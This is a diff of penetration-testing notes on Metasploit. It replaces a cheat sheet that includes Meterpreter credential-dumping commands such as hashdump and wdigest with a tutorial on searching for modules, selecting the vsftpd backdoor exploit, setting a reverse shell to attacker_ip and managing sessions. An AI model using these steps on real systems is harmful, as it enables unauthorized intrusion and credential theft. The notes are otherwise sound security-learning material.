@@ -1,37 +1,116 @@
-## Cheat Sheet
+# Metasploit
 
-| **Command**         | **Usage**                               |
-| ------------------- | --------------------------------------- |
-| msfconsole          | Starts metasploit                       |
-| use module          | Select a module                         |
-| show options        | Show the module options                 |
-| set option value    | Set a value to the option in the module |
-| run                 | Executes the module                     |
-| search type:value   | Search for a module                     |
-| services            | Show the services                       |
-| hosts               | Show the hosts                          |
-| vulns               | Show the vulnerabilities                |
-| sessions            | Show the sessions                       |
-| sessions -i id      | Select a session to use                 |
-| creds               | Show the credentials                    |
-| exploit             | Run the exploit                         |
-| show payloads       | Show the exploit payloads               |
-| set payload payload | Set a payload for the exploit           |
+Metasploit is a penetration testing framework used to develop, test and execute exploits against vulnerable systems.
 
-## Meterpreter
-Meterpreter is a powerful shell
+It provides a large collection of:
 
-### Cheat Sheet
+- exploits
+- payloads
+- auxiliary modules
+- post-exploitation modules
 
-| **Command**       | **Usage**                                |
-| ----------------- | ---------------------------------------- |
-| sysinfo           | Show system informations                 |
-| download file dir | Download a file                          |
-| upload file dir   | Upload a file                            |
-| Background        | Send a session to background             |
-| netstat           |                                          |
-| ps                | Show all the files in execution          |
-| hashdump          | Dump the hash of users and passwords     |
-| wdigest           | Show all the users and password in cache |
+Metasploit is commonly used during penetration testing to automate exploitation and post-exploitation tasks.
 
+---
 
+# Installation
+
+Metasploit is included in Kali Linux.
+
+If not installed:
+
+```bash
+sudo apt install metasploit-framework
+```
+
+Verify installation: ```bash msfconsole ```
+
+---
+
+# Starting Metasploit
+
+Launch the Metasploit console: ```bash msfconsole ```
+
+This opens the main Metasploit interface.
+
+---
+
+# Searching for Modules
+
+Search for available exploits or modules.
+
+Example: ```bash search smb ```
+
+Search for a specific vulnerability: ```bash search type:exploit vsftpd ```
+
+---
+
+# Selecting an Exploit
+
+Use a module: ```bash use exploit/unix/ftp/vsftpd_234_backdoor ```
+
+Show required options: ```bash show options ```
+
+---
+
+# Setting Parameters
+
+Set the target address: ```bash set RHOSTS target_ip ```
+
+Set local host for reverse shell: ```bash set LHOST attacker_ip ```
+
+Set local port: ```bash set LPORT 4444 ```
+
+---
+
+# Running the Exploit
+
+Execute the exploit: ```bash run ``` or ```bash exploit ```
+
+If successful, a session may be created.
+
+---
+
+# Managing Sessions
+
+List active sessions: ```bash sessions ```
+
+Interact with a session: ```bash sessions -i 1 ```
+
+---
+
+# Useful Commands
+
+Show available payloads: ```bash show payloads ```
+
+Show auxiliary modules: ```bash show auxiliary ```
+
+Show post-exploitation modules: ```bash show post ```
+
+---
+
+# Example Workflow
+
+Typical Metasploit workflow:
+
+1. Search for exploit
+
+2. Select module
+
+3. Configure target options
+
+4. Choose payload
+
+5. Run exploit
+
+6. Manage sessions
+
+---
+
+# Notes
+
+Metasploit contains many automated exploits, but understanding the vulnerability being exploited is important.
+
+Blindly running exploits without analysis may produce unreliable results.
+
+Always perform exploitation only in **authorized environments.**
